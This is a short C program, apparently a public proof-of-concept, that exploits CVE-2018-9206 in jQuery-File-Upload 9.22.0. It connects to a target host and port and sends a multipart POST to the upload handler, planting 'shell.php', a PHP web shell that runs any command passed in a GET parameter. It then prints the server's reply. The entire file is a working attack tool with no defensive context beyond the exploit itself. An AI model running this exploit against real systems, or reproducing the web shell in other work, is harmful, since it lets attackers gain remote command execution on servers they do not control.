/*Exploits CVE-2018-9206 to install a webshell.*/

#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define BSIZE 1024
#define DEBUG 1

int build_string(char *p, char *arg);

int
main (int argc, char *argv[])
{
  int sock = 0, bytes_read=0,total=0;
  struct sockaddr_in serv_addr;
  char buffer[BSIZE] = { 0 },payload[BSIZE] = { 0 };


  if (argc <= 1) {
   printf("CVE-2018-9206 Exploit\n@_larry0\nUsage: %s hostname port \n",argv[0]);
   return(0);
   }

  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      printf("\nSocket creation error\n");
      return(-1);
    }

  build_string(payload,argv[1]);

  memset (&serv_addr, '0', sizeof (serv_addr));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons (atoi (argv[2]));

  if (inet_pton (AF_INET, argv[1], &serv_addr.sin_addr) <= 0)
    {
      printf("\nInvalid address.\n");
      return(-1);
    }

  if (connect (sock, (struct sockaddr *) &serv_addr, sizeof (serv_addr)) < 0)
    {
      printf("\nConnection Failed.\n");
      return(-1);
    }
  send(sock, payload, strlen (payload), 0);
 if (DEBUG) printf("\nSending :%s\n",payload);
 while (1) 
    {
      bytes_read = recv(sock, buffer, BSIZE, 0);
      total += bytes_read;
      if (bytes_read <= 0) break;
      printf ("%s", buffer);
      bzero(buffer,BSIZE);
    }
      printf("\n[+] Total bytes read: %d\n ", total);

  return(0);
}


int build_string (char *p,char *arg) {

sprintf(p, "POST /jQuery-File-Upload-9.22.0/server/php/index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: blueimp jquery exploit/9.22.0\r\nAccept: */*\r\nContent-Length: 244\r\nContent-Type: multipart/form-data; boundary=------------------------c8e05c8871143853\r\n\r\n--------------------------c8e05c8871143853\r\nContent-Disposition: form-data; name=\"files\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php $cmd=$_GET['cmd']; system($cmd);?>\r\n\r\n--------------------------c8e05c8871143853--\r\n\r\n",arg);

return(0);
}



